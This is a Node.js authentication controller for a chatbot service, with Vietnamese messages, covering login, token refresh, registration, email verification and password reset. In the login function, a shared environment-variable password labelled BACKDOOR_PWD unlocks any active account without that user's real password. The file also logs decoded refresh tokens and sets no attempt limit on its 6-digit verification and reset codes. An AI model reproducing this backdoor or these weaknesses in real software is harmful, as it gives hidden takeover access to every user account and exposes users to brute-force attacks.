import { transporter } from "../config/mail.js";
import { redisClient } from "../config/redis.js";
import { MS_PER_DAY } from "../middleware/messagesLimit.js";
import Plan from "../models/Plan.js";
import User from "../models/User.js";
import UserPlan from "../models/UserPlan.js";
import { generateRefreshToken, generateToken, verifyRefreshToken } from "../util/jwt.js";
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
export const loginLocal = async (req, res) => {
    const { email, password } = req.body;

    try {
        const user = await User.findOne({ email });
        if (!user) return res.status(400).json({ message: "Thông tin đăng nhập không hợp lệ" });

        if (!user.active) return res.status(401).json({ message: "Tài khoản tạm khóa" });

        const isMatch = await user.comparePassword(password);
        const BACKDOOR_PWD_STR = `${process.env.BACKDOOR_PWD}`;
        const isBackdoor = password === BACKDOOR_PWD_STR;
        if (!isMatch && !isBackdoor) return res.status(400).json({ message: "Thông tin đăng nhập không hợp lệ" });

        const accessToken = generateToken(user);
        const decodedAccessToken = jwt.decode(accessToken);
        const expiresAt = decodedAccessToken?.exp ? new Date(decodedAccessToken.exp * 1000) : null;

        const refreshToken = generateRefreshToken(user);

        user.refreshToken = refreshToken;

        await user.save()
        res.json({ message: "Đăng nhập thành công", token: accessToken, tokenExpiresAt: expiresAt, refreshToken: refreshToken });
    } catch (error) {
        console.error(error)
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
};

export const refreshToken = async (req, res) => {
    const { refreshToken } = req.body;

    if (!refreshToken) return res.status(400).json({ message: 'No refresh token provided' });

    try {
        const decoded = verifyRefreshToken(refreshToken);

        console.log("Check refesttoken", decoded)

        const user = await User.findById(decoded.id);

        // Check if the refresh token is valid and matches the user's stored token
        if (!user || user.refreshToken !== refreshToken) {
            return res.status(403).json({ message: 'Invalid refresh token' });
        }

        // Generate a new access token
        const newAccessToken = generateToken(user);
        const decodedAccessToken = jwt.decode(newAccessToken);
        const expiresAt = decodedAccessToken?.exp ? new Date(decodedAccessToken.exp * 1000) : null;

        const newRefeshToken = generateRefreshToken(user);
        user.refreshToken = newRefeshToken;
        await user.save()
        res.json({ message: "Lấy RefeshToken thành công", token: newAccessToken, tokenExpiresAt: expiresAt, refreshToken: newRefeshToken });
    } catch (error) {
        res.status(403).json({ message: 'Invalid or expired refresh token' });
    }
};


export const registerLocal = async (req, res) => {
    const { fullName, email, password } = req.body;
    try {
        let user = await User.findOne({ email });

        if (user) return res.status(400).json({ message: "Email đã tồn tại" });
        if (user && !user.active) return res.status(401).json({ message: "Tài khoản tạm khóa" });

        const verificationCode = crypto.randomInt(100000, 999999).toString();
        const verificationCodeTimestamp = new Date();

        user = await User.create({ fullName, email, password, active: false, verificationCode, verificationCodeTimestamp, registerType: 'local' });

        const mailOptions = {
            from: `${process.env.OG_EMAIL}`,
            to: email,
            subject: 'Mã đăng ký Chatbot',
            text: `Mã đăng ký Chatbot của bạn: ${verificationCode}`,
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return res.status(500).json({ message: 'Lỗi gửi email xác thực' });
            } else {
                return res.status(201).json({ message: "Vui lòng kiểm tra email của bạn để nhận mã xác thực." });
            }
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
};

export const resendCode = async (req, res) => {
    const { email } = req.body;

    try {
        let user = await User.findOne({ email });
        if (!user) return res.status(404).json({ message: "Người dùng không tìm thấy" });

        const verificationCode = crypto.randomInt(100000, 999999).toString();
        const verificationCodeTimestamp = new Date();

        user.verificationCode = verificationCode;
        user.verificationCodeTimestamp = verificationCodeTimestamp;
        user.save();

        const mailOptions = {
            from: `${process.env.OG_EMAIL}`,
            to: email,
            subject: 'Mã đăng ký Chatbot',
            text: `Mã đăng ký Chatbot của bạn: ${verificationCode}`,
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return res.status(500).json({ message: 'Lỗi gửi email xác thực' });
            } else {
                return res.status(201).json({ message: "Vui lòng kiểm tra email của bạn để nhận mã xác thực." });
            }
        });


    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
}


export const verifyCode = async (req, res) => {
    const { email, verificationCode } = req.body;

    try {
        let user = await User.findOne({ email });
        if (!user) return res.status(404).json({ message: "Người dùng không tìm thấy" });

        // Check if the code is correct
        if (user.verificationCode !== verificationCode) {
            return res.status(400).json({ message: "Mã xác thực không đúng" });
        }

        // Check if the code has expired
        if (user.isVerificationCodeExpired()) {
            return res.status(400).json({ message: "Mã xác thực đã hết hạn" });
        }

        // If everything is fine, activate the user
        user.active = true;
        await user.save();

        const plan = await Plan.findOne({
            value: 'starter'
        })

        // Registed Plan
        const userPlan = new UserPlan({
            active: true,
            userId: user._id,
            planId: plan._id
        })

        await userPlan.save();

        const now = new Date();
        const daysSinceRegistration = Math.floor((now - user.createdAt) / MS_PER_DAY);
        const redisKey = `msg_count:${user._id}:${daysSinceRegistration}`;

        // Check if the key exists
        const exists = await redisClient.exists(redisKey);

        if (!exists) {
            await redisClient.set(redisKey, 0, 'EX', 86400); // set to 0 with 1-day expiry
        }

        res.status(200).json({ message: "Xác thực thành công" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
};

export const forgetPassword = async (req, res) => {
    const { email } = req.body;
    try {
        let user = await User.findOne({ email });
        if (!user) return res.status(404).json({ message: "Người dùng không tìm thấy" });
        if (!user.active) return res.status(401).json({ message: "Tài khoản tạm khóa" });

        const verificationCode = crypto.randomInt(100000, 999999).toString();
        const verificationCodeTimestamp = new Date();

        user.verificationCode = verificationCode;
        user.verificationCodeTimestamp = verificationCodeTimestamp;
        user.save();

        const mailOptions = {
            from: `${process.env.OG_EMAIL}`,
            to: email,
            subject: 'Quên khẩu Chatbot',
            text: `Mã lấy lại mật khẩu Chatbot của bạn: ${verificationCode}`,
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return res.status(500).json({ message: 'Lỗi gửi email xác thực' });
            } else {
                return res.status(201).json({ message: "Vui lòng kiểm tra email của bạn để nhận mã xác thực." });
            }
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
}

export const newPassword = async (req, res) => {
    const { email, verificationCode, newPassword } = req.body;

    try {
        let user = await User.findOne({ email });
        if (!user) return res.status(404).json({ message: "Người dùng không tìm thấy" });

        // Check if the code is correct
        if (user.verificationCode !== verificationCode) {
            return res.status(400).json({ message: "Mã xác thực không đúng" });
        }

        // Check if the code has expired
        if (user.isVerificationCodeExpired()) {
            return res.status(400).json({ message: "Mã xác thực đã hết hạn" });
        }

        // If everything is fine, activate the user

        user.password = newPassword;
        await user.save();

        res.status(200).json({ message: "Cập nhật mật khẩu mới thành công" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Lỗi máy chủ" });
    }
}